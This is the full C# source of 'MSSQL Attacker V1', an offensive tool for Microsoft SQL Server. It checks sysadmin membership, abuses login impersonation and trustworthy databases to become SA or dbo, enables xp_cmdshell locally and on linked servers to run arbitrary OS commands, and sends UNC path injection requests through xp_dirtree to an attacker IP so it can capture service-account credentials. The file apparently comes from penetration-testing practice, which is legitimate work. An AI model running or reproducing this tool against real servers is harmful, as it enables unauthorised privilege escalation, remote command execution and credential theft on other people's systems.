using System;
using System.Collections;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Runtime.InteropServices;
using System.Threading;



namespace MSSQLAttacker
{
    internal class Program
    {
        static List<string> getQueryResult(SqlConnection con, String query)
        {

            String querylogin = query;
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            List<string> output = new List<string>();
            while (reader.Read())
            {

                output.Add(reader[0].ToString());
            }
            reader.Close();
            return output;

        }


        static String getFilteredResult(List<string> input)
        {

            if (input.Count > 1)
            {
                var result = string.Join("\r\n", input.ToArray());
                return result;
            }
            if (input.Count == 0) { return ""; }
            return input[0].ToString();
        }

        static void doWrite(int state, String content, [Optional, DefaultParameterValue(2000)] int delay)
        {
            switch (state)
            {
                case 0: Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine("[-] {0}", content); Thread.Sleep(delay); Console.ResetColor(); return;
                case 1: Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine("[+] {0}", content); Thread.Sleep(delay); Console.ResetColor(); return;
                case 2: Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine("{0}", content); Console.ResetColor(); return;

            }

        }


        static SqlConnection connectDb(string server, [Optional, DefaultParameterValue("master")] string database, [Optional, DefaultParameterValue(null)] String username, [Optional, DefaultParameterValue(null)] String password)
        {
            String conString;
            if(string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password)) 
                { conString = "Server = " + server + "; Database = " + database + "; Integrated Security = True;"; }
            else 
                { conString = "Server = " + server + "; Database = " + database + "; User="+username+";password="+password; }
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                doWrite(1, "Auth success!", 0);
            }
            catch
            {
                doWrite(0, "Auth failed");
                Environment.Exit(0);
            }
            return con;

        }

        static void abuseImpersonation(SqlConnection con)
        {
            try
            {
                String user = checkImpersonation(con).Trim('\r', '\n');
                if (string.IsNullOrEmpty(user)) { return; };
                String executeas = String.Format("EXECUTE AS LOGIN = '{0}';", user);
                String temp = getQueryResult(con, executeas).ToString();
                doWrite(1, "Impersonation Success");
                return;
            }
            catch (Exception)
            {

                doWrite(0, "Impersonation Failed");
                return;
            }



        }
        static string checkImpersonateDBO(SqlConnection con)
        {

            String query = "SELECT name from sys.databases where is_trustworthy_on = 1;";
            String databaseName = getFilteredResult(getQueryResult(con, query));
            if (!string.IsNullOrEmpty(databaseName)) { doWrite(1,"Found Trustworthy Database") ; return databaseName; }
            return "";

        }

        static void runCustomQuery(SqlConnection con, [Optional, DefaultParameterValue(null)] String queryIn)
        {

            if (string.IsNullOrEmpty(queryIn))
            {
                while (true)
                {
                    try
                    {
                        Console.Write("Query> ");
                        String query = Console.ReadLine().ToString();
                        if (query == "exit") { doWrite(0, "Exiting!"); break; }
                        String execQuery = String.Format("{0};", query);
                        String output = getFilteredResult(getQueryResult(con, execQuery));
                        doWrite(2, output);
                    }
                    catch (Exception)
                    {
                        doWrite(0, "Query Execution Failed");
                        return;

                    }
                }

            }
            try
            {
                String query = String.Format("{0};", queryIn);
                Console.WriteLine(query);
                String queryout = getFilteredResult(getQueryResult(con, query));
                doWrite(2, queryout);
                return;

            }
            catch (Exception)
            {

                doWrite(0, "Missing Privileges || Ex.Sysadmin");
            }


        }
        static void abuseImpersonationDBO(SqlConnection con, [Optional, DefaultParameterValue(null)] String databaseName)
        {

            try
            {
                if (string.IsNullOrEmpty(databaseName)) { databaseName = checkImpersonateDBO(con); }
                while (string.IsNullOrEmpty(databaseName))
                {
                    Console.Write("Enter Database Name:");
                    databaseName = Console.ReadLine();
                }
                String executeas = String.Format("use {0}; EXECUTE AS USER = 'dbo';", databaseName);
                String temp = getQueryResult(con, executeas).ToString();
                doWrite(1, "Impersonation As DBO Success ");
                return;
            }
            catch (Exception)
            {

                doWrite(0, "Impersonation As DBO Failed!");
                return;
            }


        }

        static bool enableXpCmdShell(SqlConnection con)
        {

            try
            {
                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                String impersonatableUsers = getFilteredResult(getQueryResult(con, enable_xpcmd));
                doWrite(1, "xp_cmdshell enabled");

                return true;
            }
            catch (Exception)
            {

                doWrite(0, "xp_cmdshell enable fail! || Missing Privileges");
                return false;
            }
        }

        static void execCMD(SqlConnection con, [Optional, DefaultParameterValue(null)] String command)
        {

            if (!checkCmdshell(con)) {doWrite(0, "xp_cmdshell is not enabled") ;return; };
            if (string.IsNullOrEmpty(command))
            {
                while (true)
                {
                    try
                    {
                        Console.Write("Enter Command: ");
                        String cmd = Console.ReadLine().ToString();
                        if (cmd == "exit") { doWrite(0, "Exiting!"); break; }
                        String execCmd = String.Format("EXEC xp_cmdshell '{0}'", cmd);
                        String output = getFilteredResult(getQueryResult(con, execCmd));
                        doWrite(2, output);
                    }
                    catch (Exception)
                    {
                        doWrite(0, "Missing Privileges || Ex.Sysadmin");
                        return;

                    }
                }

            }
            try
            {
                String query = String.Format("EXEC xp_cmdshell '{0}'", command);
                String queryout = getFilteredResult(getQueryResult(con, query));
                doWrite(2, queryout);
                return;

            }
            catch (Exception)
            {

                doWrite(0, "Missing Privileges || Ex.Sysadmin");
            }
            

        }

        static String checkImpersonation(SqlConnection con)
        {
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            String impersonatableUsers = getFilteredResult(getQueryResult(con, query));
            if (String.IsNullOrEmpty(impersonatableUsers)) { doWrite(0, "Impersonation Not Allowed"); return ""; }
            doWrite(1, "Impersonatable Users: " + impersonatableUsers);
            return impersonatableUsers;

        }

        static void uncPathInjection(SqlConnection con, [Optional, DefaultParameterValue(null)] String lhost)
        {

            while (string.IsNullOrEmpty(lhost))
            {
                Console.Write("Enter Attacker Machine IP: ");
                lhost = Console.ReadLine();
            }
            String query = "EXEC master..xp_dirtree \"\\\\" + lhost + "\\\\anything\";";
            String request = getFilteredResult(getQueryResult(con, query));
            doWrite(1, "Request Sent to: " + lhost);
        }



        static void loginInfo(SqlConnection con)
        {

            String queryUser = "SELECT SYSTEM_USER;";
            String user = getFilteredResult(getQueryResult(con, queryUser));
            doWrite(1, "User: " + user);
            String querySysadmin = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            String role = getFilteredResult(getQueryResult(con, querySysadmin));
            if (role == "1")
            {
                doWrite(1, "User is a member of sysadmin role");
            }
            else
            {
                doWrite(0, "User is NOT a member of sysadmin role");
            }
        }

        static void enumLinkedServer(SqlConnection con)
        {
            String execCmd = "EXEC sp_linkedservers;";
            String servers = getFilteredResult(getQueryResult(con, execCmd));
            if (!string.IsNullOrEmpty(servers)) { doWrite(1, "Linked Servers: \n" + servers); return; }
            doWrite(2, "No Linked Servers");
        }

        static void enumLinkedServerVersion(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)
        {
            while (string.IsNullOrEmpty(linkedServer))
            {
                Console.Write("Enter Linked Server: ");
                linkedServer = Console.ReadLine();
            }
            String linkedServerVersion = "select version from openquery(\"" + linkedServer + "\", 'select @@version as version')";
            String versionInfo = getFilteredResult(getQueryResult(con, linkedServerVersion));
            if (!string.IsNullOrEmpty(versionInfo)) { doWrite(1, "Linked Server: " + linkedServer + "\n" + versionInfo); return; }
            doWrite(0, "No Information to retrive!");


        }

        static bool checkLinkedCmdshell(SqlConnection con, String linkedServer)
        {
            String cmdShellValinUse = "select * from openquery(\"" + linkedServer + "\", 'select value_in_use from sys.configurations where name = ''xp_cmdshell''')";
            String valueInUse = getFilteredResult(getQueryResult(con, cmdShellValinUse));
            if (valueInUse == "1") { doWrite(1, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return true; }
            else { doWrite(0, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return false; }
        }

        static bool checkCmdshell(SqlConnection con)
        {
            String cmd = "select value_in_use from sys.configurations where name = 'xp_cmdshell'";
            String valueInUse = getFilteredResult(getQueryResult(con, cmd));
            if (valueInUse == "1") { doWrite(1, "Value In Use: " + valueInUse); doWrite(1, "xp_cmdshell is enabled"); return true; }
            else { doWrite(0, "Value In Use: " + valueInUse); doWrite(0, "xp_cmdshell is not enabled" + valueInUse); return false; }
        }
        static void enableLinkedCmdShell(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)

        {
            while (string.IsNullOrEmpty(linkedServer))
            {
                Console.Write("Enter Linked Server: ");
                linkedServer = Console.ReadLine();
            }
            if (!checkLinkedCmdshell(con, linkedServer))
            {
                String enableAdvOp = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + linkedServer;
                String temp = getFilteredResult(getQueryResult(con, enableAdvOp));
                String enableXp_cmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + linkedServer;
                temp = getFilteredResult(getQueryResult(con, enableXp_cmdshell));
                doWrite(1, "xp_cmdshell enabled");
            }
            else { doWrite(1, "xp_cmdshell already enabled"); }
            return;
        }

        static void linkedServerCmdExec(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer, [Optional, DefaultParameterValue(null)] String command)
        {
            while (string.IsNullOrEmpty(linkedServer))
            {
                Console.Write("Enter Linked Server: ");
                linkedServer = Console.ReadLine();
            }
            if (!checkLinkedCmdshell(con, linkedServer))
            {
                doWrite(0, "xp_cmdshell not enabled");
                return;
            }
            if (string.IsNullOrEmpty(command))
            {
                while (true)
                {
                    Console.Write("Enter Command: ");
                    String input = Console.ReadLine();
                    if (input == "exit") { break; }
                    if (string.IsNullOrEmpty(input)) { continue; }
                    String cmd = "cmd.exe /c " + input;
                    String cmdString = "select * from openquery(\"" + linkedServer + "\", 'select @@servername; exec xp_cmdshell ''" + cmd + "''')";
                    String temp = getFilteredResult(getQueryResult(con, cmdString));
                    doWrite(2, "Command Executed");
                    return;
                }
                doWrite(0, "Exiting!");
                return;
            }
            try
            {
                String basecmd = "cmd.exe /c " + command;
                String query = "select * from openquery(\"" + linkedServer + "\", 'select @@servername; exec xp_cmdshell ''" + basecmd + "''')";
                String temp1 = getFilteredResult(getQueryResult(con, query));
                doWrite(2, "Command Executed");
            }
            catch (Exception)
            {
                doWrite(0, "Command Execution Failed!", 0);

            }
        }


        static void bannerGUI(bool gui)
        {
            if (!gui)
            {

            }
            else
            {
                Console.Clear();
                Console.Title = "MSSQL Attacker";
                Console.WriteLine("\t\t\t\t[*] MSSQL Attacker V1 by Rikunj Sindhwad [*]\n");
                Console.WriteLine("[1] Get Information\t\t\t [2] UNC PATH Injection\t\t [3] Impersonation Check\n[4] ImpersonateSA\t\t\t [5] Impersonate DBO\t\t [6] Enable xp_cmdshell\n[7] Shell_Access\t\t\t [8] Check LinkedServers\t [9] Enumerate LinkedServer Version");
                Console.WriteLine("[10] EnableLinkedServer_xp_cmdshell\t [11] LinkedServer xp_cmdshell\t[12] Custom SQL Query");
                Console.WriteLine("[0] Exit Program\n");
                Console.Write("[INPUT] Enter Value: ");
            }
        }

        static void attackGUI(string[] args)
        {
            bool exit = false;
            SqlConnection con;
            switch (args.Length)
            {
                
                case 3:
                    con = connectDb(args[1], args[2]);
                    break;
                case 5:
                    con = connectDb(args[1], args[2], args[3], args[4]);
                    break;
                default:
                    con = connectDb(args[1]);
                    break;
            }

            while (!exit)
            {

                bannerGUI(true);
                int attackVal;
                try
                {
                    attackVal = Convert.ToInt32(Console.ReadLine());
                }
                catch (Exception)
                {

                    continue;

                }

                switch (attackVal)
                {
                    case 0: exit = true; con.Close(); break;
                    case 1: loginInfo(con); break;
                    case 2: uncPathInjection(con); break;
                    case 3: checkImpersonation(con); break;
                    case 4: abuseImpersonation(con); break;
                    case 5: abuseImpersonationDBO(con); break;
                    case 6: enableXpCmdShell(con); break;
                    case 7: execCMD(con); break;
                    case 8: enumLinkedServer(con); break;
                    case 9: enumLinkedServerVersion(con); break;
                    case 10: enableLinkedCmdShell(con); break;
                    case 11: linkedServerCmdExec(con); break;
                    case 12: runCustomQuery(con); break;

                    default:
                        doWrite(0, "Invelid Key: Exiting..");
                        exit = true; break;

                }
            }

        }

        static void printGUIHelp()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Title = "MSSQL Attacker";
            Console.WriteLine("[*] MSSQL Attacker - V1 by Rikunj Sindhwad [GUI MODE] [*]");
            Console.ResetColor();
            doWrite(2, "\t\tHELP MENU",0);
            doWrite(2, " USAGE: binary.exe GUI DatabaseServer [Optional] DatabaseName [Optional] Username [Optional] Password", 0);
            doWrite(2, " USAGE: binary.exe GUI dc01.corp1.com masters SA SecretPassword", 0);

        }
        static void printCliHelp()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Title = "MSSQL Attacker";
            Console.WriteLine("[*] MSSQL Attacker - V1 by Rikunj Sindhwad [CLI MODE] [*]");
            Console.ResetColor();
            doWrite(2, "\t\tHELP MENU", 0);
            doWrite(2, " USAGE: binary.exe cli -a AttackName -t DatabaseServer -d DatabaseName\n", 0);
            doWrite(2, " -a\t\t\tAttack Mode [Add -a to get list of attacks]", 0);
            doWrite(2, " -t\t\t\tTarget Server", 0);
            doWrite(2, " -d\t\t\tTarget DatabaseName [Optional]", 0);
            doWrite(2, " -u\t\t\tTarget Username [Optional]", 0);
            doWrite(2, " -p\t\t\tTarget Password [Optional]", 0);
            doWrite(2, " -dbo\t\t\tDatabaseNmae for DBO impersonation [Optional]", 0);
            doWrite(2, " -ls\t\t\tLinked MSSQLServer Name", 0);
            doWrite(2, " -l\t\t\tAttacker IP for UNC Path Injection", 0);
            doWrite(2, " -impersonateSA\t\tImpersonateSA before execution of any attack", 0);
            doWrite(2, " -impersonateDBO\tImpersonateDBO before execution of any attack", 0);

        }

        static bool checkArgs(string[] args,String val) 
        {
            
            if (Array.Exists(args, element => element == val))
            {
                try
                {
                    String temp = args[Array.IndexOf(args, val) + 1];
                    return true;
                }
                catch (Exception)
                {

                    return false;
                }
            }
            return false;
        }

        static void printAttacks(string[] attacks)
        {
            doWrite(0, "Invelid AttackName",0);
            doWrite(1, "Available Attacks", 0);
            foreach (string attack in attacks) { doWrite(2, "\t"+attack); }  
        }
        static bool checkSubargs(string[]args, String arg)
        {
            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell" , "execlinkedcmd","execcmd", "runCustomQuery" };
            if (!Array.Exists(attacks, element => element == arg)) { printAttacks(attacks); return false; }
            if (!checkArgs(args, "-t")) { doWrite(0,"Missing -t [TARGETSERVER]", 0); return false; }
            if (arg.Contains("linked") && !arg.Contains("checklinkedservers"))
            {
                if (!checkArgs(args, "-ls")) { doWrite(0, "Missing -ls [LinkedServer]",0); return false; }
                
            }
            if (arg.Contains("cmd") && !arg.Contains("enable"))
            {
                if (!checkArgs(args, "-c")) { doWrite(0, "Missing -c [Command to execute]", 0); return false; }
                
            }
            if (arg.Contains("Custom"))
            {
                if (!checkArgs(args, "-query")) { doWrite(0, "Missing -query \"Custom SQL Query\"", 0); return false; }

            }
            if (arg.Contains("uncpathinject"))
            {
                if (!checkArgs(args, "-l")) { doWrite(0, "Missing -l [ LHOST || Attacker IP ]", 0); return false; }
                arg = args[Array.IndexOf(args, "-l") + 1];
            }
            return true;
        }
        static void attackCLI(string[] args)
        {
            String dbserver, lhost, attack;
            String linkedServer = "";
            String command = "";
            String dbname = "";
            String dboname = "";
            String customQuery = "";
            SqlConnection con;

            if(args.Length < 2) { printCliHelp(); return; }
            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell", "execlinkedcmd", "execcmd", "runCustomQuery" };
            if (!checkArgs(args, "-a")) { printAttacks(attacks); return; }
            if (checkArgs(args, "-d")) { dbname = args[Array.IndexOf(args, "-d") + 1];}
            attack = args[Array.IndexOf(args, "-a") + 1];
            if(!checkSubargs(args, attack)) { return; }

            dbserver = args[Array.IndexOf(args, "-t") + 1];
            
            linkedServer = args[Array.IndexOf(args, "-ls") + 1];
            command = args[Array.IndexOf(args, "-c") + 1];
            customQuery = args[Array.IndexOf(args, "-query") + 1];
            //Console.WriteLine(customQuery);

            if (checkArgs(args, "-dbo")) { dboname = args[Array.IndexOf(args, "-dbo") + 1]; }
            lhost = args[Array.IndexOf(args, "-l") + 1];
            // Try connecting to the specified server
            try {
                if (checkArgs(args, "-u") && checkArgs(args, "-p"))
                { 
                    String username = args[Array.IndexOf(args, "-u") + 1];
                    String password = args[Array.IndexOf(args, "-p") + 1];
                    con = connectDb(dbserver, dbname, username, password);
                }
                if (checkArgs(args, "-d"))
                {

                    con = connectDb(dbserver, dbname);
                }
                else { con = connectDb(dbserver); }
                 }
            catch (Exception) { return; }
            //Impersonation
            if (Array.Exists(args, element => element == "-impersonateSA")) { abuseImpersonation(con); }
            if (Array.Exists(args, element => element == "-impersonateDBO")){ if (checkArgs(args, "-dbo")) { abuseImpersonationDBO(con, dboname); } else { abuseImpersonationDBO(con); } }


            //Main Attack
            switch (attack.ToLower())
            {

                case "getinfo":
                    loginInfo(con);
                    break;

                case "checkimpersonate":
                    checkImpersonation(con);
                    break;
                case "checklinkedservers":
                    enumLinkedServer(con);
                    break;
                case "checklinkedserverversion":
                    enumLinkedServerVersion(con, linkedServer);
                    break;
                case "uncpathinject":
                    uncPathInjection(con, lhost);
                    break;
                case "enablecmdshell":
                    enableXpCmdShell(con);
                    break;
                case "enablelinkedcmdshell":
                    enableLinkedCmdShell(con, linkedServer);
                    break;
                case "execcmd":
                    
                    execCMD(con, command);
                    break;

                case "execlinkedcmd":
                    linkedServerCmdExec(con, linkedServer, command);
                    break;
                case "runcustomquery":
                    runCustomQuery(con, customQuery);
                    break;
                default:
                    doWrite(0, "Wrong Attack?");
                    printCliHelp();
                    break;
            }

            con.Close();
        }

        static void Main(string[] args)
        {
            if(args.Length == 0) 
            {
                printCliHelp();
                printGUIHelp();
                return;
            }
            try
            {
                if (args[0].ToLower() == "gui") {attackGUI(args); }
                if (args[0].ToLower() == "cli") {attackCLI(args);}

            }
            catch (Exception)
            {
                doWrite(0, "Something Wrong!", 0);
                throw;

            }



        }
    }
}
